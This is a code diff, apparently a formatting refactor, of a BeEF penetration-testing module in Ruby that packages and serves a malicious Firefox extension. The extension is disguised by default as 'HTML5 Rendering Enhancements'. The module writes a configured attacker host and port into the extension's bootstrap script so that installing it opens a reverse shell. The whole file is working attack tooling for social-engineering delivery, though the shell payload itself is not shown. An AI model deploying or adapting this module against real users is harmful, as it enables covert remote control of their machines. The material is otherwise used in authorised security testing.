@@ -4,7 +4,6 @@
 # See the file 'doc/COPYING' for copying permission
 #
 class Firefox_extension_reverse_shell < BeEF::Core::Command
-
   class Bind_extension < BeEF::Core::Router::Router
     before do
       headers 'Content-Type' => 'application/x-xpinstall',
@@ -14,52 +13,45 @@ class Firefox_extension_reverse_shell < BeEF::Core::Command
     end
 
     get '/' do
-      response['Content-Type'] = "application/x-xpinstall"
+      response['Content-Type'] = 'application/x-xpinstall'
       extension_path = settings.extension_path
       print_info "Serving malicious Firefox Extension (Reverse Shell): #{extension_path}"
-      send_file "#{extension_path}",
-                :type => 'application/x-xpinstall',
-                :disposition => 'inline'
+      send_file extension_path.to_s,
+                type: 'application/x-xpinstall',
+                disposition: 'inline'
     end
   end
 
   def pre_send
-
     # gets the value configured in the module configuration by the user
     @datastore.each do |input|
-       if input['name'] == "extension_name"
-          @extension_name = input['value']
-       end
-       if input['name'] == "xpi_name"
-          @xpi_name = input['value']
-       end
-       if input['name'] == "lport"
-          @lport = input['value']
-       end
-       if input['name'] == "lhost"
-          @lhost = input['value']
-       end
+      @extension_name = input['value'] if input['name'] == 'extension_name'
+      @xpi_name = input['value'] if input['name'] == 'xpi_name'
+      @lport = input['value'] if input['name'] == 'lport'
+      @lhost = input['value'] if input['name'] == 'lhost'
     end
 
     mod_path = "#{$root_dir}/modules/social_engineering/firefox_extension_reverse_shell"
-    extension_path = mod_path + "/extension"
+    extension_path = "#{mod_path}/extension"
 
     # clean the build directory
     FileUtils.rm_rf("#{extension_path}/build/.", secure: true)
 
     # copy in the build directory necessary file, substituting placeholders
-    File.open(extension_path + "/build/install.rdf", "w")     {|file| file.puts File.read(extension_path + "/install.rdf").gsub!("__extension_name_placeholder__", @extension_name)}
-    File.open(extension_path + "/build/bootstrap.js", "w")    {|file| file.puts File.read(extension_path + "/bootstrap.js").gsub!("__reverse_shell_port_placeholder__", @lport).gsub!("__reverse_shell_host_placeholder__", @lhost)}
-    File.open(extension_path + "/build/overlay.xul", "w")     {|file| file.puts File.read(extension_path + "/overlay.xul")}
-    File.open(extension_path + "/build/chrome.manifest", "w") {|file| file.puts File.read(extension_path + "/chrome.manifest")}
+    File.open("#{extension_path}/build/install.rdf", 'w') do |file|
+      file.puts File.read("#{extension_path}/install.rdf").gsub!('__extension_name_placeholder__', @extension_name)
+    end
+    File.open("#{extension_path}/build/bootstrap.js", 'w') do |file|
+      file.puts File.read("#{extension_path}/bootstrap.js").gsub!('__reverse_shell_port_placeholder__', @lport).gsub!('__reverse_shell_host_placeholder__', @lhost)
+    end
+    File.open("#{extension_path}/build/overlay.xul", 'w')     { |file| file.puts File.read("#{extension_path}/overlay.xul") }
+    File.open("#{extension_path}/build/chrome.manifest", 'w') { |file| file.puts File.read("#{extension_path}/chrome.manifest") }
 
-    extension_content = ["install.rdf", "bootstrap.js", "overlay.xul", "chrome.manifest"]
+    extension_content = ['install.rdf', 'bootstrap.js', 'overlay.xul', 'chrome.manifest']
 
     # create the XPI extension container
     xpi = "#{extension_path}/#{@xpi_name}.xpi"
-    if File.exist?(xpi)
-       File.delete(xpi)
-    end
+    File.delete(xpi) if File.exist?(xpi)
     Zip::File.open(xpi, Zip::File::CREATE) do |xpi|
       extension_content.each do |filename|
         xpi.add(filename, "#{extension_path}/build/#{filename}")
@@ -76,15 +68,15 @@ class Firefox_extension_reverse_shell < BeEF::Core::Command
   def self.options
     @configuration = BeEF::Core::Configuration.instance
     beef_host = @configuration.beef_host
-    return [
-        {'name' => 'extension_name', 'ui_label' => 'Extension name', 'value' => 'HTML5 Rendering Enhancements'},
-        {'name' => 'xpi_name', 'ui_label' => 'Extension file (XPI) name', 'value' => 'HTML5_Enhancements'},
-        {'name' => 'lport', 'ui_label' => 'Local Port', 'value' => '1337'},
-        {'name' => 'lhost', 'ui_label' => 'Local Host', 'value' => "#{beef_host}"}
+    [
+      { 'name' => 'extension_name', 'ui_label' => 'Extension name', 'value' => 'HTML5 Rendering Enhancements' },
+      { 'name' => 'xpi_name', 'ui_label' => 'Extension file (XPI) name', 'value' => 'HTML5_Enhancements' },
+      { 'name' => 'lport', 'ui_label' => 'Local Port', 'value' => '1337' },
+      { 'name' => 'lhost', 'ui_label' => 'Local Host', 'value' => beef_host.to_s }
     ]
   end
 
   def post_execute
-    save({'result' => @datastore['result']})
+    save({ 'result' => @datastore['result'] })
   end
 end
